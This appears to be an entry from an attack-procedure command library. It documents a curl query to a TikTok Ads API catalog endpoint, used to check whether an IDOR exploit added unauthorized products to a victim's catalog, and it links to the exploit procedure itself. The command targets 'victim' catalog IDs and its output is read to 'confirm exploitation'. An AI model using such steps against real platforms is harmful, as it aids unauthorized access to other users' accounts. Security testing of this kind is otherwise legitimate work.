---
data: >-
  curl -X GET 'https://ads.tiktok.com/api/catalog/products/' -H 'Authorization:
  Bearer YOUR_ACCESS_TOKEN' -H 'Content-Type: application/json' -d
  '{"catalog_id": "victim_catalog_id"}'
tags:
  - api
  - query
  - verification
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:47.326Z'
id: b3124885-17f2-45c0-aafe-a9a20c200538
verified: false
validated: true
submitted: true
---
# curl-query-catalog

## Command

```bash
curl -X GET 'https://ads.tiktok.com/api/catalog/products/' \
  -H 'Authorization: Bearer YOUR_ACCESS_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"catalog_id": "victim_catalog_id"}'
```

## Description

This command queries the TikTok Ads API to retrieve products in a specified catalog, used to verify unauthorized additions from an IDOR exploit.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method | Yes |
| `'https://ads.tiktok.com/api/catalog/products/'` | API endpoint URL | Yes |
| `-H 'Authorization: Bearer YOUR_ACCESS_TOKEN'` | Authentication header | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON content type | Yes |
| `-d '{"catalog_id": "victim_catalog_id"}'` | JSON payload specifying the catalog to query | Yes |

## Examples

### Basic Usage

```bash
curl -X GET 'https://ads.tiktok.com/api/catalog/products/' -H 'Authorization: Bearer token123' -H 'Content-Type: application/json' -d '{"catalog_id": "target_catalog_456"}'
```

### Advanced Usage

With silent output and JSON parsing (using jq if available):

```bash
curl -s -X GET 'https://ads.tiktok.com/api/catalog/products/' -H 'Authorization: Bearer token123' -H 'Content-Type: application/json' -d '{"catalog_id": "target_catalog_456"}' | jq '.'
```

## Expected Output

JSON array of products, e.g., {"products": [{"id": "prod1", "name": "Item"}, {"id": "fake_prod_123", "name": "Unauthorized Item"}]}. Look for unexpected entries to confirm exploitation.

## Related

- [[Related Procedure: Exploit-IDOR-in-TikTok-Ads-API-to-Add-Unauthorized-Products]]
